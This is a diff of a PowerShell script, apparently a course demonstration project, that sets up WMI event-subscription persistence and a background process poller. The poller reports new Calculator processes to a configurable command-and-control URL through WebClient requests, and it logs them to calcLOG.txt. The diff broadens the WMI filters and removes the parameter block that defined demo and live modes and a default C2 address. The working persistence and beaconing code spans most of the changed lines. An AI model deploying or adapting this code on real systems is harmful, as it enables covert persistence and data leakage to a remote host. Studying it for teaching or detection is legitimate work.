@@ -22,52 +22,7 @@
     Authors: Zac Davis, Caleb Clauson
     Course: IT 359 - Spring 2026
     
-.PARAMETER Verbose
-    Enable verbose output for demonstration purposes
     
-.PARAMETER DemoMode
-    If set to $true, the script will ONLY LOG actions and WILL NOT
-    EXECUTE them on the system. (Current mode)
-    
-.PARAMETER LiveMode
-    If set to $true, the script WILL ACTUATE the system, making changes
-    in memory, registry, and network calls.
-
-.PARAMETER C2Server
-    The IP address or hostname of your Command and Control (C2) server.
-    
-.PARAMETER C2Port
-    The port number of your C2 server.
-#>
-param(
-    [switch]$Verbose,
-    [switch]$DemoMode,
-    [switch]$LiveMode,
-    [switch]$Undo,
-    [string]$C2Server = '10.0.0.249',
-    [int]$C2Port = 8080
-)
-
-# Set defaults for switches when they were not explicitly provided
-if (-not $PSBoundParameters.ContainsKey('DemoMode')) { $DemoMode = $true }
-if (-not $PSBoundParameters.ContainsKey('Verbose'))  { $Verbose = $false }
-if (-not $PSBoundParameters.ContainsKey('LiveMode'))  { $LiveMode = $false }
-if (-not $PSBoundParameters.ContainsKey('Undo'))      { $Undo = $false }
-# Global State
-$Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
-$Global:C2Url = "http://${C2Server}:${C2Port}"
-# Normalize and assign mode switches (ensure booleans)
-$DemoMode = [bool]$DemoMode
-$LiveMode = [bool]$LiveMode
-$Undo = [bool]$Undo
-$Global:DemoMode = $DemoMode
-$Global:LiveMode = $LiveMode
-$Global:Undo = $Undo
-
-# ===========================================================================
-# SETUP AND HELPER FUNCTIONS
-# ==========================================================================
-
 # Check for required cmdlets (these are built-in to PowerShell)
 $missing = @()
 if (-not (Get-Command -Name Invoke-RestMethod -ErrorAction SilentlyContinue)) {
@@ -638,44 +593,80 @@ function Start-PersistentProcessPoller {
         [int]$PollInterval = 1,
         [string[]]$TargetProcessNames = @('calc','Calculator','ApplicationFrameHost')
     )
+
     $sb = {
         param($dp,$c2Url,$sid,$pollInterval,$names)
-        $known = @()
+        # Map of PID -> Visible (bool)
+        $knownState = @{}
         try {
-            $procList = Get-Process -ErrorAction SilentlyContinue | Select-Object Id,ProcessName
+            $procList = Get-Process -ErrorAction SilentlyContinue | Select-Object Id,ProcessName,MainWindowHandle,MainWindowTitle
             foreach ($p in $procList) {
                 if ($names -and $names.Count -gt 0) {
-                    foreach ($n in $names) { if ($p.ProcessName -imatch $n) { $known += $p.Id; break } }
-                } else { $known += $p.Id }
+                    $isTarget = $false
+                    foreach ($n in $names) { if ($p.ProcessName -imatch $n) { $isTarget = $true; break } }
+                    if (-not $isTarget) { continue }
+                }
+                $visible = $false
+                try { $visible = ($p.MainWindowHandle -ne 0 -and -not [string]::IsNullOrWhiteSpace($p.MainWindowTitle)) } catch { $visible = ($p.MainWindowHandle -ne 0) }
+                $knownState[$p.Id] = $visible
             }
-        } catch { $known = @() }
+        } catch { $knownState = @{} }
+
+        # write a small startup marker so users can confirm the poller job is running
+        try {
+            $startLine = "Poller started at $(Get-Date -Format o) by session $sid`r`n"
+            [System.IO.File]::AppendAllText((Join-Path $dp 'calcLOG.txt'), $startLine)
+        } catch { try { [System.IO.File]::AppendAllText((Join-Path $env:TEMP 'calcLOG.txt'), $startLine) } catch {} }
 
         while ($true) {
             Start-Sleep -Seconds $pollInterval
-            try { $currentList = Get-Process -ErrorAction SilentlyContinue | Select-Object Id,ProcessName } catch { $currentList = @() }
-            $added = @()
+            try { $currentList = Get-Process -ErrorAction SilentlyContinue | Select-Object Id,ProcessName,MainWindowHandle,MainWindowTitle } catch { $currentList = @() }
+
+            # build map of current target processes
+            $currentTargets = @{}
             foreach ($p in $currentList) {
                 if ($names -and $names.Count -gt 0) {
                     $match = $false
                     foreach ($n in $names) { if ($p.ProcessName -imatch $n) { $match = $true; break } }
                     if (-not $match) { continue }
                 }
-                if ($known -notcontains $p.Id) { $added += $p }
+                $visible = $false
+                try { $visible = ($p.MainWindowHandle -ne 0 -and -not [string]::IsNullOrWhiteSpace($p.MainWindowTitle)) } catch { $visible = ($p.MainWindowHandle -ne 0) }
+                $currentTargets[$p.Id] = @{ ProcessName = $p.ProcessName; Visible = $visible }
             }
 
-            if ($added.Count -gt 0) {
-                foreach ($proc in $added) {
-                    try {
-                        $pid = $proc.Id
-                        $pname = $proc.ProcessName
-                        $line = "Polling detected new process $pname (PID $pid) at $(Get-Date -Format o) by session $sid`r`n"
-                        [System.IO.File]::AppendAllText((Join-Path $dp 'calcLOG.txt'), $line)
-                        try { (New-Object System.Net.WebClient).DownloadString("$c2Url/?message=process-start&session=$sid&pid=$pid&proc=$pname") > $null } catch {}
-                    } catch {}
+            # detect new visible/process-start events
+            foreach ($kvp in $currentTargets.GetEnumerator()) {
+                $pid = $kvp.Key
+                $procName = $kvp.Value.ProcessName
+                $visible = $kvp.Value.Visible
+
+                if (-not $knownState.ContainsKey($pid)) {
+                    # new process seen
+                    if ($visible) {
+                        $line = "Polling detected new process $procName (PID $pid) visible at $(Get-Date -Format o) by session $sid`r`n"
+                        try { [System.IO.File]::AppendAllText((Join-Path $dp 'calcLOG.txt'), $line) } catch { [System.IO.File]::AppendAllText((Join-Path $env:TEMP 'calcLOG.txt'), $line) }
+                        try { (New-Object System.Net.WebClient).DownloadString("$c2Url/?message=process-start&session=$sid&pid=$pid&proc=$procName") > $null } catch {}
+                    }
+                    $knownState[$pid] = $visible
                 }
-                # add newly-observed ids so we don't report them again
-                foreach ($proc in $added) { $known += $proc.Id }
+                else {
+                    # was known - check visible transition
+                    if (-not $knownState[$pid] -and $visible) {
+                        $line = "Polling detected process $procName (PID $pid) became visible at $(Get-Date -Format o) by session $sid`r`n"
+                        try { [System.IO.File]::AppendAllText((Join-Path $dp 'calcLOG.txt'), $line) } catch { [System.IO.File]::AppendAllText((Join-Path $env:TEMP 'calcLOG.txt'), $line) }
+                        try { (New-Object System.Net.WebClient).DownloadString("$c2Url/?message=process-start&session=$sid&pid=$pid&proc=$procName") > $null } catch {}
+                    }
+                    # update stored state to current
+                    $knownState[$pid] = $visible
+                }
             }
+
+            # prune knownState entries for PIDs that no longer exist
+            $presentPids = $currentTargets.Keys
+            $toRemove = @()
+            foreach ($k in $knownState.Keys) { if ($presentPids -notcontains $k) { $toRemove += $k } }
+            foreach ($r in $toRemove) { $knownState.Remove($r) }
         }
     }
 
@@ -758,8 +749,8 @@ try {
             $filterInstance = $filterClass.CreateInstance()
             $filterInstance.Name = $EventName
             # Exclude PowerShell process names to avoid recursive triggers
-            # Only trigger for Calculator to avoid noisy system process events
-            $filterInstance.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'calc.exe'"
+            # Trigger for common Calculator process hosts (classic calc and UWP host)
+            $filterInstance.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name = 'calc.exe' OR TargetInstance.Name = 'ApplicationFrameHost.exe')"
             $filterInstance.QueryLanguage = "WQL"
             $filterInstance.EventNamespace = "root\cimv2"
             $filterResult = $filterInstance.Put()
@@ -771,8 +762,8 @@ try {
             Write-Host "    [*] Attempting session-based (non-persistent) fallback using Register-CimIndicationEvent/Register-WmiEvent." -ForegroundColor Yellow
 
             # Prepare session-based fallback variables (use Win32_ProcessStartTrace for reliability)
-            # Narrow session-based query to the target process (calc.exe) to avoid excessive triggers
-            $query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'calc.exe'"
+            # Narrow session-based query to common calculator process names to avoid excessive triggers
+            $query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'calc.exe' OR ProcessName = 'ApplicationFrameHost.exe' OR ProcessName = 'Calculator.exe'"
             $source = "DemoWmi_$($Global:UniqueId)"
             $c2Url = $Global:C2Url
             $sid = $Global:UniqueId
@@ -875,11 +866,11 @@ try {
                     Write-Host "    [OK] Session-based WMI action executed: calcLOG.txt created." -ForegroundColor Green
                 }
                 else {
-                    Write-Host "    [!] Session-based WMI action not observed (no calcLOG.txt). Starting persistent poller as backup." -ForegroundColor Yellow
-                    # Start a background poller to catch events repeatedly if the event action isn't firing as expected
-                            $jobName = "DemoWmiPoller_$($Global:UniqueId)"
-                            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 -TargetProcessName 'calc.exe' | Out-Null
-                            try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
+                        Write-Host "    [!] Session-based WMI action not observed (no calcLOG.txt). Starting persistent poller as backup." -ForegroundColor Yellow
+                        # Start a background poller to catch events repeatedly if the event action isn't firing as expected
+                        $jobName = "DemoWmiPoller_$($Global:UniqueId)"
+                        Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 -TargetProcessNames @('calc','ApplicationFrameHost') | Out-Null
+                        try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
                 }
                 return
             }
@@ -887,7 +878,7 @@ try {
             # Polling fallback: no registration possible, start a persistent poller job
             Write-Host "    [*] Session registration unavailable; starting persistent polling fallback." -ForegroundColor Yellow
             $jobName = "DemoWmiPoller_$($Global:UniqueId)"
-            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 -TargetProcessName 'calc.exe' | Out-Null
+            Start-PersistentProcessPoller -JobName $jobName -DesktopPath $dp -C2Url $c2Url -SessionId $sid -PollInterval 1 -TargetProcessNames @('calc','ApplicationFrameHost') | Out-Null
             try { Set-Content -Path (Join-Path $env:TEMP "$jobName.marker") -Value "Job=$jobName`nStartedAt=$(Get-Date -Format o)" -Force -ErrorAction SilentlyContinue } catch {}
             Write-Host "    [OK] Poller started (Job Name: $jobName)." -ForegroundColor Green
             return
